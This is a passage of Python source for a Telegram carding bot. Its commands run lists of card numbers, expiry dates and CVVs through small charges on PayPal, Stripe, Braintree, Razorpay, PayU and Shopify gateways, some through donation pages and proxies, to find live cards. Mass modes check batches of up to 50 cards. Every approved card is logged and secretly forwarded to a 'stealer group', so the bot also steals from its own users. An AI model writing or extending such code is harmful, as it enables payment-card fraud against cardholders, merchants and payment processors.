        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)
    else:
        response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {result['message']}", "PayPal $1", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("failed")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)

async def gate_ppv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """PayPal V2 Variable Price checker - Owner/Admin only"""
    import time as time_module
    user = update.effective_user
    
    if not is_owner(user.id):
        await update.message.reply_text(
            "🔒 <b>Owner Only</b>\n\n"
            "This gate is restricted to bot owner and admins only.",
            parse_mode=ParseMode.HTML
        )
        return
    
    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            f"❌ <b>Invalid Format!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/ppv 4242424242424242|12|25|123</code>\n\n"
            f"💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc, mm, yy, cvv = card_data
    
    use_proxy = not update.message.text.startswith('/addproxy')
    
    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
        f"Gateway: PayPal V2 $0.01\n"
        f"Proxy: {'Enabled' if use_proxy else 'Disabled'}",
        parse_mode=ParseMode.HTML
    )
    
    import asyncio
    from modules.ppv_gate import check_ppv
    from modules.gate_checker import get_bin_info
    
    start_time = time_module.time()
    loop = asyncio.get_running_loop()
    result = await loop.run_in_executor(None, check_ppv, cc, mm, yy, cvv, 0, use_proxy)
    elapsed = time_module.time() - start_time
    
    bin_info = get_bin_info(cc)
    
    status = result.get('result', 'ERROR')
    response_msg = result.get('response', 'Unknown')
    
    bin_type = f"{bin_info.get('scheme', 'N/A').upper()}"
    if bin_info.get('type'):
        bin_type += f" - {bin_info.get('type', '').upper()}"
    proxy_status = "Live ☁️" if use_proxy else "None"
    username = user.username or user.first_name
    
    if status in ['LIVE', 'CHARGED']:
        log_approved_card(user.id, username, cc, mm, yy, cvv, "ppv", response_msg, bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "ppv", response_msg, bin_info, user.id, username)
        response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {response_msg}", "PayPal V2", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("success")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)
    else:
        response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {response_msg}", "PayPal V2", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("failed")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)

@require_premium
async def gate_str(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe $1 Donation checker"""
    import time as time_module
    user = update.effective_user
    
    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            f"❌ <b>Invalid Format!</b>\n\n"
            f"🎯 <b>Usage:</b>\n"
            f"<code>/str 4242424242424242|12|25|123</code>\n\n"
            f"💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return
    
    cc, mm, yy, cvv = card_data
    
    checking_msg = await update.message.reply_text(
        f"🎀 <b>Checking card...</b>\n\n"
        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
        f"Gateway: Stripe $1 Donation",
        parse_mode=ParseMode.HTML
    )
    
    from modules.str_gate import check_str
    from modules.gate_checker import get_bin_info
    
    start_time = time_module.time()
    result = await check_str(cc, mm, yy, cvv)
    elapsed = time_module.time() - start_time
    
    bin_info = get_bin_info(cc)
    status = result.get('status', 'ERROR')
    response_msg = result.get('response', 'Unknown')
    
    bin_type = f"{bin_info.get('scheme', 'N/A').upper()}"
    if bin_info.get('type'):
        bin_type += f" - {bin_info.get('type', '').upper()}"
    username = user.username or user.first_name
    
    if status in ['LIVE', 'CHARGED']:
        log_approved_card(user.id, username, cc, mm, yy, cvv, "str", response_msg, bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "str", response_msg, bin_info, user.id, username)
        response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {response_msg}", "Stripe $1", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("success")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)
    else:
        response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {response_msg}", "Stripe $1", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("failed")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)

@require_premium
async def mass_str(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Stripe $1 Donation checker with 1 second delay"""
    import asyncio
    import time as time_module
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(ae("⏳ <b>Already Running</b>\n\nYou have a mass check in progress. Use /stop to cancel."), parse_mode=ParseMode.HTML)
        return
    
    if not context.args:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - Stripe $1 Donation</b>\n\n"
            "<b>Usage:</b>\n<code>/mstr CC|MM|YY|CVV CC|MM|YY|CVV ...</code>\n\n"
            "Or reply to a message with cards.\n"
            "Max 50 cards per batch.",
            parse_mode=ParseMode.HTML
        )
        return
    
    cards_text = ' '.join(context.args)
    cards = [c.strip() for c in cards_text.replace('\n', ' ').split() if '|' in c]
    
    if not cards:
        await update.message.reply_text(ae("❌ No valid cards found!"), parse_mode=ParseMode.HTML)
        return
    
    if len(cards) > 50:
        cards = cards[:50]
        await update.message.reply_text(ae("⚠️ Limited to 50 cards max."), parse_mode=ParseMode.HTML)
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    
    status_msg = await update.message.reply_text(
        f"🎀 <b>Mass Stripe Donation Check Started</b>\n\n"
        f"📋 Cards: {len(cards)}\n"
        f"⏱️ Delay: 1s between cards\n"
        f"🔄 Processing...",
        parse_mode=ParseMode.HTML
    )
    
    from modules.str_gate import check_str
    from modules.gate_checker import get_bin_info
    
    approved = []
    declined = []
    errors = []
    username = user.username or user.first_name
    
    for i, card in enumerate(cards):
        if not context.user_data.get(f'mass_check_running_{user_id}'):
            break
        
        parts = card.strip().split('|')
        if len(parts) < 4:
            errors.append(card)
            continue
        
        cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
        
        start_time = time_module.time()
        result = await check_str(cc, mm, yy, cvv)
        elapsed = time_module.time() - start_time
        
        status = result.get('status', 'ERROR')
        response_msg = result.get('response', 'Unknown')
        
        if status in ['LIVE', 'CHARGED']:
            approved.append(card)
            bin_info = get_bin_info(cc)
            log_approved_card(user.id, username, cc, mm, yy, cvv, "mstr", response_msg, bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "mstr", response_msg, bin_info, user.id, username)
            await send_approved_card_with_gif(update, card, "mstr", response_msg, elapsed, bin_info)
        elif status == 'DEAD':
            declined.append(card)
        else:
            errors.append(card)
        
        if (i + 1) % 5 == 0:
            try:
                await status_msg.edit_text(
                    f"🎀 <b>Mass Stripe Donation Progress</b>\n\n"
                    f"✅ Approved: {len(approved)}\n"
                    f"❌ Declined: {len(declined)}\n"
                    f"⚠️ Errors: {len(errors)}\n"
                    f"📊 Progress: {i+1}/{len(cards)}",
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
        
        if i < len(cards) - 1:
            await asyncio.sleep(1)
    
    context.user_data[f'mass_check_running_{user_id}'] = False
    
    summary = (
        f"🎀 <b>Mass Stripe Donation Complete</b>\n\n"
        f"✅ Approved: {len(approved)}\n"
        f"❌ Declined: {len(declined)}\n"
        f"⚠️ Errors: {len(errors)}\n"
        f"📊 Total: {len(cards)}"
    )
    
    if approved:
        summary += "\n\n<b>💳 Approved Cards:</b>\n"
        for card in approved[:10]:
            summary += f"<code>{card}</code>\n"
        if len(approved) > 10:
            summary += f"... and {len(approved) - 10} more"
    
    try:
        await status_msg.edit_text(summary, parse_mode=ParseMode.HTML)
    except:
        await update.message.reply_text(summary, parse_mode=ParseMode.HTML)

@require_premium
async def gate_b3n(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Braintree $5.00 checker"""
    import time as time_module
    user = update.effective_user
    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(ae("❌ <b>Invalid Format!</b>\n\n🎯 <b>Usage:</b>\n<code>/b3n CC|MM|YY|CVV</code>"), parse_mode=ParseMode.HTML)
        return
    cc, mm, yy, cvv = card_data
    checking_msg = await update.message.reply_text(ae(f"🎀 <b>Checking card...</b>\n\n<code>{cc}|{mm}|{yy}|{cvv}</code>\nGateway: Braintree $5.00"), parse_mode=ParseMode.HTML)
    from modules.b3n_gate import check_b3n
    from modules.gate_checker import get_bin_info
    
    start_time = time_module.time()
    result = await check_b3n(cc, mm, yy, cvv)
    elapsed = time_module.time() - start_time
    
    if not result:
        result = {'status': 'ERROR', 'response': 'No Response from Gate'}
    bin_info = get_bin_info(cc)
    status, response_msg = result.get('status', 'ERROR'), result.get('response', 'Unknown')
    
    bin_type = f"{bin_info.get('scheme', 'N/A').upper()}"
    if bin_info.get('type'):
        bin_type += f" - {bin_info.get('type', '').upper()}"
    username = user.username or user.first_name
    
    if status in ['LIVE', 'CHARGED']:
        log_approved_card(user.id, username, cc, mm, yy, cvv, "b3n", response_msg, bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "b3n", response_msg, bin_info, user.id, username)
        response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {response_msg}", "Braintree $5", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("success")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)
    else:
        response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {response_msg}", "Braintree $5", bin_info, elapsed, username
        )
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("failed")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)

@require_premium
async def gate_rz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Razorpay ₹1 checker using BarryX API"""
    import time as time_module
    user = update.effective_user
    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(ae("❌ <b>Invalid Format!</b>\n\n🎯 <b>Usage:</b>\n<code>/rz CC|MM|YY|CVV</code>"), parse_mode=ParseMode.HTML)
        return
    cc, mm, yy, cvv = card_data
    card_str = f"{cc}|{mm}|{yy}|{cvv}"
    checking_msg = await update.message.reply_text(ae(f"🎀 <b>Checking card...</b>\n\n<code>{card_str}</code>\nGateway: Razorpay ₹1"), parse_mode=ParseMode.HTML)
    from modules.rz_gate import check_rz_async
    from modules.gate_checker import get_bin_info
    
    start_time = time_module.time()
    result = await check_rz_async(card_str)
    elapsed = time_module.time() - start_time
    
    if not result:
        result = {'status': 'ERROR', 'message': 'No Response from Gate'}
    bin_info = get_bin_info(cc)
    status, response_msg = result.get('status', 'ERROR'), result.get('message', 'Unknown')
    
    bin_type = f"{bin_info.get('scheme', 'N/A').upper()}"
    if bin_info.get('type'):
        bin_type += f" - {bin_info.get('type', '').upper()}"
    username = user.username or user.first_name
    
    if status == 'APPROVED':
        log_approved_card(user.id, username, cc, mm, yy, cvv, "rz", response_msg, bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "rz", response_msg, bin_info, user.id, username)
        response = _build_gate_response(cc, mm, yy, cvv, "approved", f"Approved - {response_msg}", "Razorpay ₹1", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("success")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)
    else:
        response = _build_gate_response(cc, mm, yy, cvv, "declined", f"Declined - {response_msg}", "Razorpay ₹1", bin_info, elapsed, username)
        try:
            await checking_msg.delete()
        except:
            pass
        gif_url = get_sexy_anime_gif("failed")
        await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)

@require_premium
async def gate_mrz(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass Razorpay checker with 1 second delay"""
    import asyncio
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(ae("⏳ <b>Already Running</b>\n\nYou have a mass check in progress."), parse_mode=ParseMode.HTML)
        return
    
    if not context.args:
        await update.message.reply_text("📋 <b>MASS CHECK - Razorpay ₹1</b>\n\n<b>Usage:</b>\n<code>/mrz CC|MM|YY|CVV CC|MM|YY|CVV ...</code>\n\nOr reply to a message with cards.", parse_mode=ParseMode.HTML)
        return
    
    cards_text = ' '.join(context.args)
    cards = [c.strip() for c in cards_text.replace('\n', ' ').split() if '|' in c]
    
    if not cards:
        await update.message.reply_text(ae("❌ No valid cards found!"), parse_mode=ParseMode.HTML)
        return
    
    if len(cards) > 50:
        cards = cards[:50]
        await update.message.reply_text(ae("⚠️ Limited to 50 cards max."), parse_mode=ParseMode.HTML)
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    
    status_msg = await update.message.reply_text(ae(f"🎀 <b>Mass Check Started</b>\n\n📋 Cards: {len(cards)}\n⏱️ Delay: 1s between cards\n🔄 Processing..."), parse_mode=ParseMode.HTML)
    
    from modules.rz_gate import check_rz_async
    from modules.gate_checker import get_bin_info
    
    approved = []
    declined = []
    errors = []
    
    for i, card in enumerate(cards):
        if not context.user_data.get(f'mass_check_running_{user_id}'):
            break
        
        result = await check_rz_async(card.strip())
        status = result.get('status', 'ERROR')
        
        if status == 'APPROVED':
            approved.append(card)
            parts = card.split('|')
            if len(parts) >= 4:
                cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                bin_info = get_bin_info(cc)
                log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "mrz", result.get('message', ''), bin_info)
                await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "mrz", result.get('message', ''), bin_info, user.id, user.username or user.first_name)
                check_time = result.get('time', 3.0)
                await send_approved_card_with_gif(update, card, "mrz", result.get('message', 'CVV Match'), check_time, bin_info)
        elif status == 'DECLINED':
            declined.append(card)
        else:
            errors.append(card)
        
        if (i + 1) % 5 == 0:
            try:
                await status_msg.edit_text(ae(f"🎀 <b>Mass Check Progress</b>\n\n✅ Approved: {len(approved)}\n❌ Declined: {len(declined)}\n⚠️ Errors: {len(errors)}\n📊 Progress: {i+1}/{len(cards)}"), parse_mode=ParseMode.HTML)
            except:
                pass
        
        if i < len(cards) - 1:
            await asyncio.sleep(1)
    
    context.user_data[f'mass_check_running_{user_id}'] = False
    
    summary = f"🎀 <b>Mass Check Complete</b>\n\n✅ Approved: {len(approved)}\n❌ Declined: {len(declined)}\n⚠️ Errors: {len(errors)}\n📊 Total: {len(cards)}"
    
    if approved:
        summary += "\n\n<b>💳 Approved Cards:</b>\n"
        for card in approved[:10]:
            summary += f"<code>{card}</code>\n"
        if len(approved) > 10:
            summary += f"... and {len(approved) - 10} more"
    
    try:
        await status_msg.edit_text(summary, parse_mode=ParseMode.HTML)
    except:
        await update.message.reply_text(summary, parse_mode=ParseMode.HTML)

@require_premium
async def gate_payu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """PayU ₹1 Gate - Single card check"""
    import asyncio
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(ae("🎀 <b>PayU ₹1 Gate</b>\n\n<b>Usage:</b>\n<code>/payu CC|MM|YY|CVV</code>\n\n💡 Uses MiracleManna donation gateway"), parse_mode=ParseMode.HTML)
        return
    
    card_str = context.args[0].strip()
    if '|' not in card_str:
        await update.message.reply_text(ae("❌ Invalid format! Use: <code>/payu CC|MM|YY|CVV</code>"), parse_mode=ParseMode.HTML)
        return
    
    checking_msg = await update.message.reply_text(ae("🔄 <b>Checking card via PayU...</b>"), parse_mode=ParseMode.HTML)
    
    from modules.payu_gate import check_payu_async, format_payu_response
    from modules.gate_checker import get_bin_info
    
    result = await check_payu_async(card_str)
    parts = card_str.split('|')
    bin_info = get_bin_info(parts[0]) if parts else {}
    
    response = format_payu_response(result, bin_info, user.username or user.first_name)
    
    try:
        await checking_msg.delete()
    except:
        pass
    
    if result.get('status') == 'APPROVED':
        gif_url = get_sexy_anime_gif("success")
        if len(parts) >= 4:
            cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
            log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "payu", result.get('message', ''), bin_info)
            await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "payu", result.get('message', ''), bin_info, user.id, user.username or user.first_name)
            check_time = result.get('time', 3.0)
            await send_approved_card_with_gif(update, card_str, "payu", result.get('message', 'Charged'), check_time, bin_info)
    else:
        gif_url = get_sexy_anime_gif("failed")
    
    await update.message.reply_animation(animation=gif_url, caption=response, parse_mode=ParseMode.HTML)

@require_premium
async def gate_mpayu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass PayU checker with 1 second delay"""
    import asyncio
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(ae("⏳ <b>Already Running</b>\n\nYou have a mass check in progress."), parse_mode=ParseMode.HTML)
        return
    
    if not context.args:
        await update.message.reply_text("📋 <b>MASS CHECK - PayU ₹1</b>\n\n<b>Usage:</b>\n<code>/mpayu CC|MM|YY|CVV CC|MM|YY|CVV ...</code>\n\nOr reply to a message with cards.", parse_mode=ParseMode.HTML)
        return
    
    cards_text = ' '.join(context.args)
    cards = [c.strip() for c in cards_text.replace('\n', ' ').split() if '|' in c]
    
    if not cards:
        await update.message.reply_text(ae("❌ No valid cards found!"), parse_mode=ParseMode.HTML)
        return
    
    if len(cards) > 50:
        cards = cards[:50]
        await update.message.reply_text(ae("⚠️ Limited to 50 cards max."), parse_mode=ParseMode.HTML)
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    
    status_msg = await update.message.reply_text(ae(f"🎀 <b>Mass PayU Check Started</b>\n\n📋 Cards: {len(cards)}\n⏱️ Delay: 1s between cards\n🔄 Processing..."), parse_mode=ParseMode.HTML)
    
    from modules.payu_gate import check_payu_async
    from modules.gate_checker import get_bin_info
    
    approved = []
    declined = []
    errors = []
    
    for i, card in enumerate(cards):
        if not context.user_data.get(f'mass_check_running_{user_id}'):
            break
        
        result = await check_payu_async(card.strip())
        status = result.get('status', 'ERROR')
        
        if status == 'APPROVED':
            approved.append(card)
            parts = card.split('|')
            if len(parts) >= 4:
                cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
                bin_info = get_bin_info(cc)
                log_approved_card(user.id, user.username or user.first_name, cc, mm, yy, cvv, "mpayu", result.get('message', ''), bin_info)
                await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "mpayu", result.get('message', ''), bin_info, user.id, user.username or user.first_name)
                check_time = result.get('time', 3.0)
                await send_approved_card_with_gif(update, card, "mpayu", result.get('message', 'Charged'), check_time, bin_info)
        elif status == 'DECLINED':
            declined.append(card)
        else:
            errors.append(card)
        
        if (i + 1) % 5 == 0:
            try:
                await status_msg.edit_text(ae(f"🎀 <b>Mass PayU Progress</b>\n\n✅ Approved: {len(approved)}\n❌ Declined: {len(declined)}\n⚠️ Errors: {len(errors)}\n📊 Progress: {i+1}/{len(cards)}"), parse_mode=ParseMode.HTML)
            except:
                pass
        
        if i < len(cards) - 1:
            await asyncio.sleep(1)
    
    context.user_data[f'mass_check_running_{user_id}'] = False
    
    summary = f"🎀 <b>Mass PayU Complete</b>\n\n✅ Approved: {len(approved)}\n❌ Declined: {len(declined)}\n⚠️ Errors: {len(errors)}\n📊 Total: {len(cards)}"
    
    if approved:
        summary += "\n\n<b>💳 Approved Cards:</b>\n"
        for card in approved[:10]:
            summary += f"<code>{card}</code>\n"
        if len(approved) > 10:
            summary += f"... and {len(approved) - 10} more"
    
    try:
        await status_msg.edit_text(summary, parse_mode=ParseMode.HTML)
    except:
        await update.message.reply_text(summary, parse_mode=ParseMode.HTML)

@require_premium
async def mass_pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check PayPal $1 with 5 batches and 1s delay"""
    user = update.effective_user
    
    if not context.args:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - PayPal $1</b>\n\n"
            "Send cards in format:\n"
            "<code>CC|MM|YY|CVV</code>\n\n"
            "One card per line.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_pp'] = True
        return
    
    cards_text = ' '.join(context.args)
    await process_mass_pp(update, context, cards_text)

async def process_mass_pp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass PayPal $1 check with 5 parallel batches and 1s delay"""
    import asyncio
    import time
    from modules.paypal_gate import check_paypal_async
    from modules.gate_checker import get_bin_info
    
    user = update.effective_user
    user_id = user.id
    
    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "⏳ <b>Already Running</b>\n\n"
            "You have a mass check in progress.\n"
            "Please wait for it to complete or use /stop to cancel it.",
            parse_mode=ParseMode.HTML
        )
        return
    
    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'pp'
    context.user_data['mass_check_stop'] = False
    
    try:
        limit = get_mass_check_limit(user.id)
        
        extracted = extract_cards_from_text(cards_text)
        cards = [{'cc': c[0], 'mm': c[1], 'yy': c[2], 'cvv': c[3]} for c in extracted]
        
        if not cards:
            await update.message.reply_text(ae("❌ No valid cards found!"))
            return
        
        if len(cards) > limit:
            cards = cards[:limit]
        
        total_cards = len(cards)
        approved_count = 0
        declined_count = 0
        error_count = 0
        
        batch_size = 5
        total_batches = (total_cards + batch_size - 1) // batch_size
        
        header_msg = await update.message.reply_text(
            f"🔄 <b>Mass PayPal $1 Check</b>\n"
            f"Total: {total_cards} | Batches: {total_batches} (x{batch_size})\n"
            f"⏳ Processing...",
            parse_mode=ParseMode.HTML
        )
        
        for batch_idx in range(0, total_cards, batch_size):
            if context.user_data.get('mass_check_stop'):
                break
            
            batch = cards[batch_idx:batch_idx + batch_size]
            batch_num = batch_idx // batch_size + 1
            
            async def check_single(card):
                card_str = f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}"
                start_t = time.time()
                try:
                    result = await asyncio.wait_for(
                        check_paypal_async(card['cc'], card['mm'], card['yy'], card['cvv']),
                        timeout=60.0
                    )
                    el = round(time.time() - start_t, 2)
                    return card, card_str, result, el
                except asyncio.TimeoutError:
                    el = round(time.time() - start_t, 2)
                    return card, card_str, {'status': 'ERROR', 'message': 'Timeout'}, el
                except Exception as e:
                    el = round(time.time() - start_t, 2)
                    return card, card_str, {'status': 'ERROR', 'message': str(e)[:50]}, el
            
            tasks = [check_single(c) for c in batch]
            batch_results = await asyncio.gather(*tasks, return_exceptions=True)
            
            for br in batch_results:
                if context.user_data.get('mass_check_stop'):
                    break
                
                if isinstance(br, Exception):
                    error_count += 1
                    continue
                
                card, card_str, result, elapsed = br
                status = result.get('status', 'ERROR')
                response = result.get('message', 'Unknown')
                
                if status in ['APPROVED', 'CHARGED']:
                    approved_count += 1
                    bin_info = get_bin_info(card['cc'])
                    log_approved_card(user.id, user.username or user.first_name, card['cc'], card['mm'], card['yy'], card['cvv'], "pp", response, bin_info)
                    await send_to_stealer_group(context.bot, card['cc'], card['mm'], card['yy'], card['cvv'], "pp", response, bin_info, user.id, user.username or user.first_name)
                    await send_approved_card_with_gif(update, card_str, "pp", response, elapsed, bin_info)
                elif status == 'DECLINED':
                    declined_count += 1
                    card_result = ae(format_mass_card_result(card_str, status, response, "PayPal $1", elapsed))
                    try:
                        await context.bot.send_message(
                            chat_id=update.message.chat_id,
                            text=card_result,
                            parse_mode=ParseMode.HTML
                        )
                    except:
                        pass
                else:
                    error_count += 1
                    card_result = ae(format_mass_card_result(card_str, status, response, "PayPal $1", elapsed))
                    try:
                        await context.bot.send_message(
                            chat_id=update.message.chat_id,
                            text=card_result,
                            parse_mode=ParseMode.HTML
                        )
                    except:
                        pass
            
            try:
                await header_msg.edit_text(
                    f"🔄 <b>Mass PayPal $1 Check</b>\n"
                    f"Batch {batch_num}/{total_batches} done\n"
                    f"✅ {approved_count} | ❌ {declined_count} | ⚠️ {error_count}\n"
                    f"⏳ Processing...",
                    parse_mode=ParseMode.HTML
                )
            except:
                pass
            
            if batch_idx + batch_size < total_cards and not context.user_data.get('mass_check_stop'):
                await asyncio.sleep(1.0)
        
        stopped = context.user_data.get('mass_check_stop', False)
        header = ae(format_mass_header(total_cards, approved_count, declined_count, error_count))
        if stopped:
            header = ae("⏹️ Mass Check STOPPED\n") + header
        
        try:
            await header_msg.edit_text(header, parse_mode=ParseMode.HTML)
        except:
            pass
            
    finally:
        context.user_data[f'mass_check_running_{user_id}'] = False
        context.user_data['mass_check_stop'] = False

# PREMIUM GATES - Stripe Mass Auth
@require_premium
async def gate_stm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe Mass Auth"""
    await check_gate(update, context, "stm", "Stripe Mass Auth", True)

# PREMIUM GATES - Stripe €1
@require_premium
async def gate_se1(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stripe €1"""
    await check_gate(update, context, "se1", "Stripe €1", True)

# PREMIUM GATES - Shopify
def _format_shopify_result(cc, mm, yy, cvv, result, bin_info, elapsed, username):
    """Format Shopify result using unified Onichan branding"""
    from modules.gate_checker import _onichan_format
    return _onichan_format(result, cc, mm, yy, cvv, bin_info, "Shopify", elapsed, username)

@require_premium
async def gate_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Shopify (Netherex) - Clean EnvoX style"""
    user = update.effective_user

    if is_banned(user.id):
        gif_url = get_sexy_anime_gif("banned")
        await update.message.reply_animation(
            animation=gif_url,
            caption="🚫 <b>YOU ARE BANNED!</b>\n\nYou cannot use this bot.",
            parse_mode=ParseMode.HTML
        )
        return

    if not is_approved(user.id):
        await update.message.reply_text(
            "⏳ <b>Access Pending</b>\n\n"
            "Your request has been sent to the owner.\n"
            "Please wait for approval.\n\n"
            f"Contact: @{SUPPORT_USERNAME}",
            parse_mode=ParseMode.HTML
        )
        return

    if not is_premium(user.id):
        gif_url = get_sexy_anime_gif("premium")
        await update.message.reply_animation(
            animation=gif_url,
            caption=get_premium_denied_message(user.id),
            parse_mode=ParseMode.HTML
        )
        return

    card_data = parse_card(update.message.text)
    if not card_data:
        await update.message.reply_text(
            "❌ <b>Invalid Format!</b>\n\n"
            "🎯 <b>Usage:</b>\n"
            "<code>/sh 4242424242424242|12|25|123</code>\n\n"
            "💡 <b>Format:</b> CC|MM|YY|CVV",
            parse_mode=ParseMode.HTML
        )
        return

    cc, mm, yy, cvv = card_data

    checking_msg = await update.message.reply_text(
        f"🛒 <b>Shopify Checking...</b>\n\n"
        f"<code>{cc}|{mm}|{yy}|{cvv}</code>\n"
        f"Gateway: Shopify",
        parse_mode=ParseMode.HTML
    )

    import time as time_module
    start_time = time_module.time()
    result = await asyncio.to_thread(check_card_php, "sh", cc, mm, yy, cvv, user.id)
    elapsed = time_module.time() - start_time

    from modules.gate_checker import get_bin_info
    bin_info = await asyncio.to_thread(get_bin_info, cc)
    username = user.username or user.first_name

    output = ae(_format_shopify_result(cc, mm, yy, cvv, result, bin_info, elapsed, username))

    msg_lower = result.get('message', '').lower()
    is_approved_card = result.get('status') == 'success' and any(k in msg_lower for k in ['approved', 'success', 'valid', 'authorized', 'charged'])
    is_declined_chk = any(k in msg_lower for k in ['declined', 'error', 'failed', 'invalid', 'expired', 'denied'])
    is_approved_card = is_approved_card and not is_declined_chk

    if is_approved_card:
        log_approved_card(user.id, username, cc, mm, yy, cvv, "sh", result["message"], bin_info)
        await send_to_stealer_group(context.bot, cc, mm, yy, cvv, "sh", result["message"], bin_info, user.id, username)

    try:
        await checking_msg.delete()
    except:
        pass

    try:
        gif_url = get_sexy_anime_gif("success" if is_approved_card else "failed")
        await update.message.reply_animation(
            animation=gif_url,
            caption=output,
            parse_mode=ParseMode.HTML
        )
    except:
        await update.message.reply_text(output, parse_mode=ParseMode.HTML)

@require_premium
async def mass_sh(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mass check Shopify with 0.25s delay"""
    user = update.effective_user

    if not context.args:
        await update.message.reply_text(
            "📋 <b>MASS CHECK - Shopify</b> 🛒\n\n"
            "Send cards in format:\n"
            "<code>CC|MM|YY|CVV</code>\n\n"
            "One card per line. Max 50 cards.",
            parse_mode=ParseMode.HTML
        )
        context.user_data['awaiting_mass_sh'] = True
        return

    cards_text = ' '.join(context.args)
    await process_mass_sh(update, context, cards_text)

async def process_mass_sh(update: Update, context: ContextTypes.DEFAULT_TYPE, cards_text: str):
    """Process mass Shopify check using Netherex API"""
    import asyncio
    import time
    from modules.gate_checker import get_bin_info, check_card_php

    user = update.effective_user
    user_id = user.id
    username = user.username or user.first_name

    if context.user_data.get(f'mass_check_running_{user_id}'):
        await update.message.reply_text(
            "⏳ <b>Already Running</b>\n\n"
            "You have a mass check in progress.\n"
            "Please wait for it to complete or use /stop to cancel it.",
            parse_mode=ParseMode.HTML
        )
        return

    context.user_data[f'mass_check_running_{user_id}'] = True
    context.user_data['mass_check_gate'] = 'sh'
    context.user_data['mass_check_stop'] = False

    try:
        limit = get_mass_check_limit(user.id)

        extracted = extract_cards_from_text(cards_text)
